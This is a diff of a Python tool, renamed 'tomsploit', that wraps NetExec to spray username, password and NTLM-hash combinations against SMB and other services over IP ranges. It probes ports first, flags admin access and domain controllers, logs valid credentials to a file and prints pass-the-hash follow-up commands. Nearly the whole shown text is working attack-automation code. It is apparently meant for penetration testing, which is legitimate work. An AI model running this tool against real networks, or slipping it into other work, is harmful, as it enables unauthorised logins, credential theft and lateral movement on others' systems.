+        return
+
+    # Anon SMB next steps
+    if result.anon_smb:
+        print_anon_smb_commands(result.real_ip or result.target)
+
+    # Real credentials
+    if result.successes:
+        # Stable display order: canonical protocol order, then domain before local
+        def sort_key(s: Success) -> tuple[int, int]:
+            try:
+                return (ALL_PROTOCOLS.index(s.protocol), int(s.local_auth))
+            except ValueError:
+                return (len(ALL_PROTOCOLS), int(s.local_auth))
+        ordered = sorted(result.successes, key=sort_key)
+        print(f"\n  {GREEN}{BOLD}✓ VALID CREDENTIALS{RESET}\n")
+        for s in ordered:
+            badge = f" {YELLOW}[admin]{RESET}" if s.is_admin else ""
+            print(f"    {GREEN}►{RESET} {BOLD}{s.label:<20}{RESET} "
+                  f"{DIM}│{RESET} {s.raw_message}{badge}")
+        print()
+
+    # Guest mappings — surfaced but explicitly NOT treated as real auth
+    if result.guests:
+        print(f"  {YELLOW}{BOLD}⚠ GUEST MAPPING — likely not real auth{RESET}")
+        print(f"  {DIM}Samba's `map to guest = bad user` accepts any creds and "
+              f"downgrades to guest.{RESET}")
+        print(f"  {DIM}Treat as info disclosure, not a working login.{RESET}\n")
+        for s in result.guests:
+            print(f"    {YELLOW}►{RESET} {BOLD}{s.label:<20}{RESET} "
+                  f"{DIM}│{RESET} {s.raw_message}")
+        print()
+
+    # THE headline output — suggested commands for real creds
+    if result.successes:
+        print_suggested_commands(result, extra_hash)
+
+    print(f"{'═' * BANNER_WIDTH}\n")
+
+
+# ─── Input handling ────────────────────────────────────────────────────
+
+def read_value_or_file(source: str) -> list[str]:
+    if os.path.isfile(source):
+        try:
+            with open(source) as f:
+                return [line.strip() for line in f if line.strip()]
+        except OSError as exc:
+            raise ValueError(f"Cannot read '{source}': {exc}") from exc
+    return [source]
+
+
+def expand_targets(specs: Iterable[str], max_hosts: int) -> list[str]:
+    """Expand IPs, hostnames, and CIDRs into a deduplicated, order-preserved
+    list of hosts."""
     out: list[str] = []
     seen: set[str] = set()
     for raw in specs:
@@ -338,514 +676,188 @@ def expand_targets(specs: Iterable[str],
                 net = ipaddress.ip_network(spec, strict=False)
             except ValueError:
                 if spec not in seen:
-                    out.append(spec)
-                    seen.add(spec)
+                    seen.add(spec); out.append(spec)
                 continue
-            if net.num_addresses > max_cidr_hosts:
+            if net.num_addresses > max_hosts:
                 raise ValueError(
                     f"{spec} expands to {net.num_addresses} hosts "
-                    f"(cap: {max_cidr_hosts}). Raise with --max-cidr-hosts."
+                    f"(cap: {max_hosts}). Raise with --max-cidr-hosts."
                 )
-            if net.num_addresses == 1:
-                addr = str(net.network_address)
+            hosts = ([net.network_address] if net.num_addresses == 1
+                     else list(net.hosts()))
+            for h in hosts:
+                addr = str(h)
                 if addr not in seen:
-                    out.append(addr)
-                    seen.add(addr)
-            else:
-                for h in net.hosts():
-                    addr = str(h)
-                    if addr not in seen:
-                        out.append(addr)
-                        seen.add(addr)
+                    seen.add(addr); out.append(addr)
         else:
             if spec not in seen:
-                out.append(spec)
-                seen.add(spec)
+                seen.add(spec); out.append(spec)
     return out
 
 
-def tcp_probe(host: str, port: int, timeout: float = PORT_PROBE_TIMEOUT) -> bool:
-    """Single TCP connect; True if it completes within `timeout`."""
+def parse_protocol_list(spec: str | None) -> list[str]:
+    if not spec:
+        return list(ALL_PROTOCOLS)
+    items = {s.strip().lower() for s in spec.split(",") if s.strip()}
+    unknown = items - set(ALL_PROTOCOLS)
+    if unknown:
+        raise ValueError(
+            f"Unknown protocol(s): {', '.join(sorted(unknown))}. "
+            f"Valid: {', '.join(ALL_PROTOCOLS)}"
+        )
+    return [p for p in ALL_PROTOCOLS if p in items]
+
+
+# ─── Port probe ────────────────────────────────────────────────────────
+
+def tcp_probe(host: str, port: int) -> bool:
     try:
-        with socket.create_connection((host, port), timeout=timeout):
+        with socket.create_connection((host, port), timeout=PORT_PROBE_TIMEOUT):
             return True
     except (OSError, socket.timeout):
         return False
 
 
-def probe_protocols(host: str, protocols: list[str],
-                    timeout: float = PORT_PROBE_TIMEOUT,
-                    workers: int = PORT_PROBE_WORKERS) -> set[str]:
-    """Concurrently probe the default port for each protocol; return the
-    set of protocols whose port is open."""
-    open_protos: set[str] = set()
-    with ThreadPoolExecutor(max_workers=workers) as pool:
-        futures = {
-            pool.submit(tcp_probe, host, PROTOCOL_PORTS[p], timeout): p
-            for p in protocols if p in PROTOCOL_PORTS
-        }
-        for f in as_completed(futures):
+def probe_protocols(host: str, protos: list[str]) -> list[str]:
+    """Return protocols whose default port answers a TCP connect, in
+    canonical order."""
+    open_set: set[str] = set()
+    with ThreadPoolExecutor(max_workers=10) as pool:
+        futs = {pool.submit(tcp_probe, host, PROTOCOL_PORTS[p]): p for p in protos}
+        for f in as_completed(futs):
             try:
                 if f.result():
-                    open_protos.add(futures[f])
+                    open_set.add(futs[f])
             except Exception:
                 pass
-    return open_protos
+    return [p for p in protos if p in open_set]
 
 
-def read_value_or_file(source: str) -> list[str]:
-    """If `source` is a file path, return its non-empty lines; else [source]."""
-    if os.path.isfile(source):
-        try:
-            with open(source) as f:
-                return [line.strip() for line in f if line.strip()]
-        except OSError as exc:
-            raise ValueError(f"Cannot read file '{source}': {exc}") from exc
-    return [source]
-
-
-def shell_format(template: str, **fields) -> str:
-    """Format a command template, shell-quoting every substituted value.
-
-    All values pass through shlex.quote(), so embedded quotes, spaces and
-    backslashes survive copy-paste into a real shell.
-    """
-    quoted = {k: shlex.quote(str(v)) if v else "''" for k, v in fields.items()}
-    return template.format(**quoted)
-
-
-def parse_protocol_list(spec: str | None, all_protos: list[str]) -> list[str]:
-    """Parse a comma-separated subset of protocols, preserving canonical order."""
-    if not spec:
-        return list(all_protos)
-    items = {s.strip().lower() for s in spec.split(",") if s.strip()}
-    unknown = items - set(all_protos)
-    if unknown:
-        raise ValueError(
-            f"Unknown protocol(s): {', '.join(sorted(unknown))}. "
-            f"Valid: {', '.join(all_protos)}"
-        )
-    return [p for p in all_protos if p in items]
-
-
-# ─── Reporter ───────────────────────────────────────────────────────────
-
-class Reporter:
-    """Renders banners, per-target results, summaries, and command hints.
-
-    Stateless aside from the `quiet` flag — the orchestrator hands it
-    populated TargetSummary objects to print.
-    """
-
-    def __init__(self, quiet: bool = False):
-        self.quiet = quiet
-
-    # ─ Pre-scan banner ─
-    def scan_banner(self, *, targets: int, users: int, passwords: int,
-                    hashes: int, workers: int, mode: str, log_file: str,
-                    creds_file: str | None, kerberos: bool,
-                    protocols: list[str], total_attempts: int) -> None:
-        print(f"\n{BOLD}{'═' * BANNER_WIDTH}{RESET}")
-        print(f"  {CYAN}{BOLD}⚡ NetExec Automator{RESET}")
-        print(f"{'═' * BANNER_WIDTH}")
-        proto_label = "all" if len(protocols) == len(ALL_PROTOCOLS) else ",".join(protocols)
-        print(f"  Targets         {DIM}│{RESET} {BOLD}{targets:<11}{RESET} Protocols {DIM}│{RESET} {BOLD}{proto_label}{RESET}")
-        print(f"  Users           {DIM}│{RESET} {BOLD}{users:<11}{RESET} Workers   {DIM}│{RESET} {BOLD}{workers}{RESET}")
-        cred_label = f"{passwords}p / {hashes}h"
-        print(f"  Credentials     {DIM}│{RESET} {BOLD}{cred_label:<11}{RESET} Timeout   {DIM}│{RESET} {BOLD}{NETEXEC_TIMEOUT}s{RESET}/attempt")
-        print(f"  Pairing Mode    {DIM}│{RESET} {BOLD}{mode.upper():<11}{RESET} Log File  {DIM}│{RESET} {BOLD}{log_file}{RESET}")
-        if kerberos:
-            print(f"  Auth Method     {DIM}│{RESET} {BOLD}Kerberos (ticket cache){RESET}")
-        if creds_file:
-            print(f"  Creds Output    {DIM}│{RESET} {BOLD}{creds_file}{RESET}")
-        print(f"  Total Tasks     {DIM}│{RESET} {BOLD}{total_attempts}{RESET}")
-        print(f"{'═' * BANNER_WIDTH}\n")
-
-    # ─ Target header / port probe ─
-    def target_header(self, target: str) -> None:
-        print(f"  {GREEN}{BOLD}► {target}{RESET}")
-
-    def port_probe(self, summary: TargetSummary) -> None:
-        if self.quiet or not summary.closed_protocols:
-            return
-        names = ", ".join(p.upper() for p in summary.closed_protocols)
-        n_open = len(summary.open_protocols)
-        n_total = n_open + len(summary.closed_protocols)
-        print(f"    {DIM}↳ Port probe: {n_open}/{n_total} open · skipping {names}{RESET}\n")
-
-    def all_closed(self, summary: TargetSummary) -> None:
-        print(f"    {RED}{BOLD}✗ No open ports — skipping.{RESET}\n")
-
-    # ─ Per-target results ─
-    def target_results(self, summary: TargetSummary) -> None:
-        ip_label = f" {DIM}({summary.real_ip}){RESET}" if summary.real_ip and summary.real_ip != summary.target else ""
-        dc_label = f" {YELLOW}{BOLD}[Domain Controller]{RESET}" if summary.is_dc else ""
-        elapsed_label = f" {DIM}[{summary.elapsed:.1f}s]{RESET}" if summary.elapsed > 0 else ""
-
-        print(f"\n{'─' * BANNER_WIDTH}")
-        print(f"  {CYAN}{BOLD}📋 Results{RESET}{ip_label}{dc_label}{elapsed_label}")
-        print(f"{'─' * BANNER_WIDTH}")
-
-        # Target info line (from any [*] response)
-        target_info = next((pr.target_info for pr in summary.protocol_results if pr.target_info), "")
-        if target_info and not self.quiet:
-            print(f"    {DIM}{target_info}{RESET}")
-        print()
-
-        # Anonymous SMB block
-        if summary.anon_smb_lines:
-            self._render_block("SMB (anon)", summary.anon_smb_lines, success_color=YELLOW)
-
-        # Credentialled protocol results
-        no_output: list[str] = []
-        for pr in summary.protocol_results:
-            label = f"{pr.protocol.upper()} ({'local' if pr.local_auth else 'domain'})"
-            if not pr.status_lines:
-                no_output.append(pr.protocol.upper())
-                continue
-            self._render_block(label, pr.status_lines)
-
-        if no_output and not self.quiet:
-            ordered = [p for p in ALL_PROTOCOLS if p.upper() in set(no_output)]
-            print(f"\n  {DIM}── No response: {', '.join(ordered)}{RESET}")
-
-        print(f"\n{'─' * BANNER_WIDTH}")
-
-    def _render_block(self, label: str, lines: list[tuple[str, str]],
-                      success_color: str = GREEN) -> None:
-        icon = self._status_icon(lines)
-        first = True
-        for marker, msg in lines:
-            prefix = f"  {icon} {BOLD}{label:<20}{RESET}" if first else f"      {'':<20}"
-            first = False
-            if marker == "[+]":
-                print(f"{prefix} {success_color}{msg}{RESET}")
-            elif marker == "[-]" and not self.quiet:
-                print(f"{prefix} {DIM}{msg}{RESET}")
-            elif marker == "[!]":
-                print(f"{prefix} {YELLOW}{msg}{RESET}")
-
-    @staticmethod
-    def _status_icon(lines: list[tuple[str, str]]) -> str:
-        has_success = any(m == "[+]" for m, _ in lines)
-        has_skip = any(m == "[!]" for m, _ in lines)
-        if has_success:
-            return f"{GREEN}✔{RESET}"
-        if has_skip:
-            return f"{YELLOW}⏱{RESET}"
-        return f"{RED}✘{RESET}"
-
-    # ─ Valid creds summary + suggested commands ─
-    def valid_credentials(self, summary: TargetSummary) -> None:
-        if not summary.successes and not summary.anon_smb_success:
-            if not self.quiet:
-                print(f"\n  {RED}{BOLD}✗ No valid credentials found.{RESET}\n")
-            print(f"{'═' * BANNER_WIDTH}\n")
-            return
-
-        if summary.anon_smb_success:
-            self.anon_smb_commands(summary.real_ip or summary.target)
-
-        if summary.successes:
-            print(f"\n  {GREEN}{BOLD}✓ VALID CREDENTIALS{RESET}\n")
-            for s in summary.successes:
-                color = YELLOW if s.label.endswith("(anon)") else GREEN
-                badge = f" {YELLOW}[admin]{RESET}" if s.is_admin else ""
-                print(f"    {color}►{RESET} {BOLD}{s.label:<20}{RESET} {DIM}│{RESET} {s.raw_message}{badge}")
-            print()
-
-        print(f"{'═' * BANNER_WIDTH}\n")
-
-    def anon_smb_commands(self, ip: str) -> None:
-        print(f"\n  {CYAN}{BOLD}💡 Anonymous SMB — Suggested Next Steps{RESET}")
-        print(f"  {'─' * (BANNER_WIDTH - 2)}")
-        for label, template in ANON_SMB_COMMANDS:
-            cmd = template.format(ip=ip)  # safe: ip is validated
-            print(f"    {YELLOW}►{RESET} {BOLD}{label:<28}{RESET} {cmd}")
-        print()
-
-    def suggested_commands(self, summary: TargetSummary,
-                           hash_for_suggestions: str | None) -> None:
-        """Print per-protocol follow-up commands for credentialled successes."""
-        cred_successes = [s for s in summary.successes
-                          if not s.label.endswith("(anon)")]
-        if not cred_successes:
-            return
-
-        seen: set[str] = set()
-        blocks: list[tuple[str, list[tuple[str, str]]]] = []
-
-        for s in cred_successes:
-            if s.protocol in seen:
-                continue
-            seen.add(s.protocol)
-            entries = self._build_command_entries(
-                s, summary, hash_for_suggestions
-            )
-            if entries:
-                blocks.append((s.protocol.upper(), entries))
-
-        if not blocks:
-            return
-
-        dc_tag = f" {YELLOW}[DC]{RESET}" if summary.is_dc else ""
-        print(f"  {CYAN}{BOLD}💡 Suggested Commands{RESET}{dc_tag}")
-        print(f"  {'─' * (BANNER_WIDTH - 2)}")
-        for proto_label, entries in blocks:
-            if len(entries) == 1:
-                sub_label, cmd = entries[0]
-                tag = f" {DIM}({sub_label}){RESET}" if sub_label else ""
-                print(f"    {GREEN}►{RESET} {BOLD}[{proto_label}]{RESET}{tag} {cmd}")
-            else:
-                print(f"    {GREEN}►{RESET} {BOLD}[{proto_label}]{RESET}")
-                for sub_label, cmd in entries:
-                    tag = f"{DIM}({sub_label}){RESET} " if sub_label else ""
-                    print(f"        {DIM}│{RESET} {tag}{cmd}")
-        print()
-
-    def _build_command_entries(self, s: Success, summary: TargetSummary,
-                               hash_for_suggestions: str | None
-                               ) -> list[tuple[str, str]]:
-        ip = summary.real_ip or summary.target
-        hostname = summary.hostname or ip
-        domain = s.domain
-        fqdn = f"{hostname}.{domain}" if domain else hostname
-        user_domain = f"{domain}\\{s.user}" if domain else s.user
-        smb_userspec = f"{domain}\\{s.user}%{s.secret}" if domain and not s.is_hash else f"{s.user}%{s.secret}"
-
-        # Hash forms — prefer the success's secret if it's a hash, otherwise
-        # fall back to the -H flag the user supplied.
-        hash_src = s.secret if s.is_hash else hash_for_suggestions
-        hash_lmnt, hash_nt = normalize_hash_forms(hash_src)
-
-        fields = {
-            "ip": ip,
-            "user": s.user,
-            "domain": domain,
-            "hostname": hostname,
-            "fqdn": fqdn,
-            "user_domain": user_domain,
-            "password": "" if s.is_hash else s.secret,
-            "connection_url_pw": f"{domain}/{s.user}:{s.secret}@{ip}" if not s.is_hash else "",
-            "connection_url_hash": f"{domain}/{s.user}@{ip}",
-            "smb_userspec": smb_userspec,
-            "hash_lmnt": hash_lmnt,
-            "hash_nt": hash_nt,
-        }
-
-        proto = s.protocol
-        entries: list[tuple[str, str]] = []
-
-        if summary.is_dc and proto in DC_COMMAND_TEMPLATES:
-            if not s.is_hash:
-                for sub, tmpl in DC_COMMAND_TEMPLATES[proto]:
-                    entries.append((sub, shell_format(tmpl, **fields)))
-            if hash_src and proto in DC_HASH_TEMPLATES:
-                for sub, tmpl in DC_HASH_TEMPLATES[proto]:
-                    entries.append((f"{sub} [hash]", shell_format(tmpl, **fields)))
-        else:
-            if not s.is_hash and proto in COMMAND_TEMPLATES:
-                entries.append(("", shell_format(COMMAND_TEMPLATES[proto], **fields)))
-            if hash_src and proto in HASH_TEMPLATES:
-                entries.append(("[hash]", shell_format(HASH_TEMPLATES[proto], **fields)))
-
-        return entries
-
-    # ─ Summary table (multi-target scans) ─
-    def summary_table(self, summaries: list[TargetSummary]) -> None:
-        total_success = sum(1 for s in summaries if s.successes or s.anon_smb_success)
-        print(f"\n{BOLD}{'═' * BANNER_WIDTH}{RESET}")
-        print(f"  {CYAN}{BOLD}📊 Scan Summary{RESET}  {DIM}({len(summaries)} targets){RESET}")
-        print(f"{'═' * BANNER_WIDTH}")
-        for entry in summaries:
-            has_creds = bool(entry.successes) or entry.anon_smb_success
-            icon = f"{GREEN}✔{RESET}" if has_creds else f"{RED}✘{RESET}"
-            host_label = entry.target
-            if entry.hostname:
-                host_label += f" {DIM}({entry.hostname}){RESET}"
-            if entry.is_dc:
-                host_label += f" {YELLOW}[DC]{RESET}"
-            time_label = f" {DIM}[{entry.elapsed:.1f}s]{RESET}"
-            n_creds = len(entry.successes) + (1 if entry.anon_smb_success else 0)
-            cred_label = f" {GREEN}{n_creds} cred{'s' if n_creds != 1 else ''}{RESET}" if has_creds else ""
-            skip_label = f" {DIM}({entry.skipped_reason}){RESET}" if not entry.scanned else ""
-            print(f"  {icon} {host_label}{cred_label}{time_label}{skip_label}")
-        print(f"\n  Total: {GREEN}{BOLD}{total_success}{RESET}/{len(summaries)} targets with credentials")
-        print(f"{'═' * BANNER_WIDTH}\n")
-
-
-# ─── Side-file for valid credentials ────────────────────────────────────
+# ─── Credential file ───────────────────────────────────────────────────
 
 CREDS_HEADER = (
-    "# netexec-automator valid credentials\n"
+    "# tomsploit valid credentials\n"
     "# target\tprotocol\tscope\tdomain\tuser\tauth_type\tsecret\tprivilege\ttimestamp\n"
 )
 
 
-def append_credentials(path: str, summary: TargetSummary) -> None:
-    """Append all of a target's valid credentials to a TSV side-file."""
-    if not summary.successes:
+def append_creds(path: str, result: TargetResult) -> None:
+    if not result.successes:
         return
     is_new = not os.path.exists(path)
     now = datetime.now().isoformat(timespec="seconds")
     with open(path, "a") as f:
         if is_new:
             f.write(CREDS_HEADER)
-        for s in summary.successes:
-            row = "\t".join([
-                summary.real_ip or summary.target,
-                s.protocol,
-                s.scope,
-                s.domain or "-",
-                s.user,
-                s.auth_type.value,
-                s.secret,
+        for s in result.successes:
+            f.write("\t".join([
+                result.real_ip or result.target,
+                s.protocol, s.scope,
+                s.domain or "-", s.user,
+                s.auth_type.value, s.secret,
                 "admin" if s.is_admin else "user",
                 now,
-            ])
-            f.write(row + "\n")
+            ]) + "\n")
 
 
-# ─── Orchestrator ───────────────────────────────────────────────────────
+# ─── Orchestrator ──────────────────────────────────────────────────────
 
-class NxcAutomator:
-    """Drives the scan: builds credential pairs, port-probes each target,
-    runs nxc concurrently per protocol, and delegates output to a Reporter."""
-
-    def __init__(
-        self,
-        *,
-        targets: list[str],
-        users: list[str],
-        passwords: list[str],
-        hashes: list[str],
-        hash_for_suggestions: str | None = None,
-        kerberos: bool = False,
-        protocols: list[str],
-        output: str | None = None,
-        creds_file: str | None = None,
-        workers: int = DEFAULT_WORKERS,
-        mode: str = "combination",
-        quiet: bool = False,
-        json_output: str | None = None,
-        no_port_probe: bool = False,
-    ):
+class TomSploit:
+    def __init__(self, *, targets, users, passwords, hashes, kerberos,
+                 protocols, log_file, creds_file, json_out, workers,
+                 quiet, debug, no_port_probe, extra_hash):
         self.targets = targets
         self.users = users
         self.passwords = passwords
         self.hashes = hashes
-        self.hash_for_suggestions = hash_for_suggestions
         self.kerberos = kerberos
         self.protocols = protocols
-        self.mode = mode.lower()
+        self.log_file = log_file
+        self.creds_file = creds_file
+        self.json_out = json_out
         self.workers = workers
         self.quiet = quiet
-        self.json_output = json_output
-        self.creds_file = creds_file
+        self.debug = debug
         self.no_port_probe = no_port_probe
+        self.extra_hash = extra_hash  # for PtH command suggestions
 
-        self.credential_pairs = self._build_credential_pairs()
-        self.log_file = output or datetime.now().strftime("%Y-%m-%d_%H-%M-%S") + ".txt"
+        self.creds = self._build_creds()
+        if not self.creds:
+            raise ValueError("No credentials to test (need -p, -H, or -k).")
 
-        self.reporter = Reporter(quiet=quiet)
-        self.lock = threading.Lock()
-        self.completed = 0
-        self.total_tasks = 0
-        self.scan_start_time = 0.0
-
-        # Cancellation plumbing for clean Ctrl-C.
-        self._stop_event = threading.Event()
+        # Cancellation
+        self._stop = threading.Event()
         self._procs_lock = threading.Lock()
-        self._active_procs: set[subprocess.Popen] = set()
+        self._procs: set[subprocess.Popen] = set()
 
-    # ─── credential pair construction ──────────────────────────────────
-    def _build_credential_pairs(self) -> list[CredentialPair]:
+        # Progress
+        self._progress_lock = threading.Lock()
+        self._done = 0
+        self._total = 0
+
+    def _build_creds(self) -> list[Cred]:
         if self.kerberos:
-            # Kerberos uses the cached TGT; secret is irrelevant.
-            return [CredentialPair(u, "", AuthType.KERBEROS) for u in self.users]
-
-        pairs: list[CredentialPair] = []
-        if self.mode == "combination":
-            pairs.extend(CredentialPair(u, p, AuthType.PASSWORD)
-                         for u in self.users for p in self.passwords)
-            pairs.extend(CredentialPair(u, h, AuthType.HASH)
-                         for u in self.users for h in self.hashes)
-        elif self.mode == "linear":
-            if self.passwords and len(self.users) != len(self.passwords):
-                raise ValueError(
-                    "Linear mode requires equal-length user and password lists."
-                )
-            if self.hashes and len(self.users) != len(self.hashes):
-                raise ValueError(
-                    "Linear mode requires equal-length user and hash lists."
-                )
-            pairs.extend(CredentialPair(u, p, AuthType.PASSWORD)
-                         for u, p in zip(self.users, self.passwords))
-            pairs.extend(CredentialPair(u, h, AuthType.HASH)
-                         for u, h in zip(self.users, self.hashes))
-        else:
-            raise ValueError(f"Unsupported pairing mode: {self.mode}")
-
-        if not pairs:
-            raise ValueError("No credentials to test (provide -p, -H, or -k).")
+            return [Cred(u, "", AuthType.KERBEROS) for u in self.users]
+        pairs: list[Cred] = []
+        pairs += [Cred(u, p, AuthType.PASSWORD)
+                  for u in self.users for p in self.passwords]
+        pairs += [Cred(u, h, AuthType.HASH)
+                  for u in self.users for h in self.hashes]
         return pairs
 
-    # ─── progress bar ──────────────────────────────────────────────────
-    def _redraw_progress(self) -> None:
-        if self.total_tasks <= 0:
+    def cancel(self) -> None:
+        self._stop.set()
+        with self._procs_lock:
+            for proc in list(self._procs):
+                try:
+                    proc.terminate()
+                except OSError:
+                    pass
+
+    # ─── progress bar ─
+    def _redraw(self) -> None:
+        if self._total <= 0:
             return
+        pct = int(100 * self._done / self._total)
         bar_len = 20
-        filled = int(bar_len * self.completed / self.total_tasks)
-        bar = f"{'█' * filled}{'░' * (bar_len - filled)}"
-        pct = int(100 * self.completed / self.total_tasks)
-        elapsed = time.time() - self.scan_start_time if self.scan_start_time else 0
-        if elapsed > 0 and self.completed > 0:
-            rate = self.completed / elapsed
-            remaining = self.total_tasks - self.completed
-            eta = int(remaining / rate) if rate > 0 else 0
-            eta_str = f" ETA {eta}s" if 0 < eta < 9999 else ""
-        else:
-            eta_str = ""
+        filled = int(bar_len * self._done / self._total)
+        bar = "█" * filled + "░" * (bar_len - filled)
         sys.stderr.write(
-            f"\r  {DIM}{bar} {pct:3d}% ({self.completed}/{self.total_tasks}){eta_str}{RESET}"
+            f"\r  {DIM}{bar} {pct:3d}% ({self._done}/{self._total}){RESET} "
         )
         sys.stderr.flush()
 
-    def _bump(self, n: int = 1) -> None:
-        with self.lock:
-            self.completed += n
-            self._redraw_progress()
+    def _tick(self, n: int = 1) -> None:
+        with self._progress_lock:
+            self._done += n
+            self._redraw()
 
-    def _print_live(self, msg: str) -> None:
-        with self.lock:
-            sys.stderr.write("\r" + " " * PROGRESS_CLEAR_WIDTH + "\r")
-            sys.stderr.flush()
+    def _clear_progress(self) -> None:
+        sys.stderr.write("\r" + " " * 70 + "\r")
+        sys.stderr.flush()
+
+    def _say(self, msg: str) -> None:
+        with self._progress_lock:
+            self._clear_progress()
             print(msg, flush=True)
-            self._redraw_progress()
+            self._redraw()
 
-    # ─── subprocess plumbing (interruptible) ───────────────────────────
-    def _run_subprocess(self, cmd: list[str], timeout: float
-                        ) -> tuple[str, str, bool]:
-        """Run a tracked subprocess. Returns (stdout, stderr, timed_out).
-
-        Raises InterruptedError if the cancellation event is set before/during
-        execution.
-        """
-        if self._stop_event.is_set():
+    # ─── subprocess wrapper ─
+    def _run_proc(self, cmd: list[str], timeout: float) -> tuple[str, str, bool]:
+        """Run nxc. Returns (stdout, stderr, timed_out)."""
+        if self._stop.is_set():
             raise InterruptedError()
         try:
-            proc = subprocess.Popen(
-                cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True
-            )
+            proc = subprocess.Popen(cmd, stdout=subprocess.PIPE,
+                                    stderr=subprocess.PIPE, text=True)
         except FileNotFoundError as exc:
             return "", f"executable not found: {exc.filename}", False
-
         with self._procs_lock:
-            self._active_procs.add(proc)
+            self._procs.add(proc)
         try:
             try:
-                stdout, stderr = proc.communicate(timeout=timeout)
-                return stdout or "", stderr or "", False
+                out, err = proc.communicate(timeout=timeout)
+                return out or "", err or "", False
             except subprocess.TimeoutExpired:
                 proc.kill()
                 try:
@@ -855,368 +867,326 @@ class NxcAutomator:
                 return "", "", True
         finally:
             with self._procs_lock:
-                self._active_procs.discard(proc)
+                self._procs.discard(proc)
 
-    def cancel(self) -> None:
-        """Signal cancellation and tear down active subprocesses."""
-        if self._stop_event.is_set():
-            return
-        self._stop_event.set()
-        with self._procs_lock:
-            for proc in list(self._active_procs):
-                try:
-                    proc.terminate()
-                except OSError:
-                    pass
-
-    # ─── nxc command builder ───────────────────────────────────────────
-    def _build_nxc_command(self, protocol: str, target: str,
-                           pair: CredentialPair, local_auth: bool) -> list[str]:
-        cmd = ["nxc", protocol, target, "-u", pair.user]
-        if pair.is_kerberos:
+    # ─── one nxc invocation ─
+    def _nxc_cmd(self, proto: str, target: str, cred: Cred,
+                 local_auth: bool) -> list[str]:
+        cmd = ["nxc", proto, target, "-u", cred.user]
+        if cred.is_kerberos:
             cmd.append("--use-kcache")
-        elif pair.is_hash:
-            cmd.extend(["-H", pair.secret])
+        elif cred.is_hash:
+            cmd.extend(["-H", cred.secret])
         else:
-            cmd.extend(["-p", pair.secret])
+            cmd.extend(["-p", cred.secret])
         if local_auth:
             cmd.append("--local-auth")
         cmd.extend(["--timeout", str(NETEXEC_TIMEOUT), "--log", self.log_file])
         return cmd
 
-    # ─── per-protocol task ─────────────────────────────────────────────
-    def _classify(self, stdout: str, stderr: str) -> str:
-        combined = "\n".join(p for p in (stdout, stderr) if p).lower()
-        if not combined:
-            return "ambiguous"
-        if any(pat in combined for pat in AUTH_RESPONSE_PATTERNS):
-            return "credential_response"
-        if any(pat in combined for pat in CONNECTIVITY_TIMEOUT_PATTERNS):
-            return "connectivity_timeout"
-        for line in (stdout + "\n" + stderr).split("\n"):
-            m, _ = parse_nxc_line(line.strip())
-            if m in ("[+]", "[-]", "[*]", "[!]"):
-                return "credential_response"
-        return "ambiguous"
-
-    def _run_protocol_task(self, protocol: str, target: str,
-                           local_auth: bool) -> ProtocolResult:
-        result = ProtocolResult(protocol=protocol, local_auth=local_auth)
-        timeout_count = 0
-        total_per_task = len(self.credential_pairs)
-        ran = 0
+    # ─── one (protocol, scope) task ─
+    def _scan_protocol(self, proto: str, target: str,
+                        local_auth: bool) -> tuple[list[tuple[str, str]], list[Success], str]:
+        """Run every credential pair against (proto, local_auth) for one
+        target. Returns (status_lines, successes, target_info)."""
+        lines: list[tuple[str, str]] = []
+        successes: list[Success] = []
+        target_info = ""
+        consecutive_timeouts = 0
         scope_label = "local" if local_auth else "domain"
 
-        for pair in self.credential_pairs:
-            if self._stop_event.is_set():
+        for cred in self.creds:
+            if self._stop.is_set():
                 break
-            cmd = self._build_nxc_command(protocol, target, pair, local_auth)
+
+            # Skip auth methods this protocol can't use (e.g. hash vs ssh).
+            if cred.is_hash and proto not in WINDOWS_PROTOS:
+                self._tick(); continue
+            if cred.is_kerberos and proto not in WINDOWS_PROTOS:
+                self._tick(); continue
+
+            cmd = self._nxc_cmd(proto, target, cred, local_auth)
             try:
-                stdout, stderr, timed_out = self._run_subprocess(
-                    cmd, timeout=SUBPROCESS_TIMEOUT
-                )
+                stdout, stderr, timed_out = self._run_proc(cmd, SUBPROCESS_TIMEOUT)
             except InterruptedError:
                 break
 
             if timed_out:
-                timeout_count += 1
-                ran += 1
-                self._bump()
-                if timeout_count >= MAX_RETRY:
-                    result.timeout_skipped = True
-                    result.status_lines.append((
-                        "[!]", f"{MAX_RETRY} consecutive timeouts — skipped"
-                    ))
-                    self._print_live(
-                        f"  {YELLOW}⏱ {protocol.upper()} ({scope_label}){RESET}"
-                        f" {DIM}{MAX_RETRY} consecutive timeouts — skipping{RESET}"
-                    )
-                    remaining = total_per_task - ran
-                    if remaining > 0:
-                        self._bump(remaining)
+                consecutive_timeouts += 1
+                self._tick()
+                if consecutive_timeouts >= MAX_CONSECUTIVE_TIMEOUTS:
+                    lines.append(("[!]",
+                                  f"{MAX_CONSECUTIVE_TIMEOUTS} consecutive timeouts — skipped"))
+                    self._say(f"  {YELLOW}⏱ {proto.upper()} ({scope_label}){RESET} "
+                              f"{DIM}consecutive timeouts — skipping{RESET}")
+                    # Tick the remaining attempts so the bar stays honest.
+                    self._tick(len(self.creds) - (self.creds.index(cred) + 1))
                     break
                 continue
+            consecutive_timeouts = 0
 
-            classification = self._classify(stdout, stderr)
-            timeout_count = 0 if classification != "connectivity_timeout" else timeout_count + 1
-
-            # Process stdout lines.
-            for raw_line in stdout.split("\n"):
-                marker, msg = parse_nxc_line(raw_line.strip())
+            # Parse stdout
+            for raw in stdout.split("\n"):
+                marker, msg = parse_nxc_line(raw.strip())
                 if marker == "[*]":
-                    if not result.target_info:
-                        result.target_info = msg
-                elif marker in ("[+]", "[-]", "[!]"):
-                    result.status_lines.append((marker, msg))
-                    if marker == "[+]":
-                        domain, user, secret, is_admin = parse_nxc_credential_message(msg)
-                        # Prefer the message-derived secret; fall back to pair.
-                        if not secret:
-                            secret = pair.secret
-                            user = user or pair.user
-                        success = Success(
-                            protocol=protocol,
-                            local_auth=local_auth,
-                            domain=domain,
-                            user=user,
-                            secret=secret,
-                            auth_type=pair.auth_type,
-                            is_admin=is_admin,
-                            raw_message=msg,
-                        )
-                        result.successes.append(success)
-                        self._print_live(
-                            f"  {GREEN}{BOLD}⚡ {protocol.upper()} ({scope_label}){RESET}"
-                            f" {GREEN}{msg}{RESET}"
-                        )
-
-            # Stderr handling: only surface when stdout was empty or we saw a
-            # connectivity failure.
-            if stderr and (not stdout or classification == "connectivity_timeout"):
-                marker = "[!]" if classification == "connectivity_timeout" else "[-]"
-                for raw_line in stderr.split("\n"):
-                    line = raw_line.strip()
-                    if not line:
-                        continue
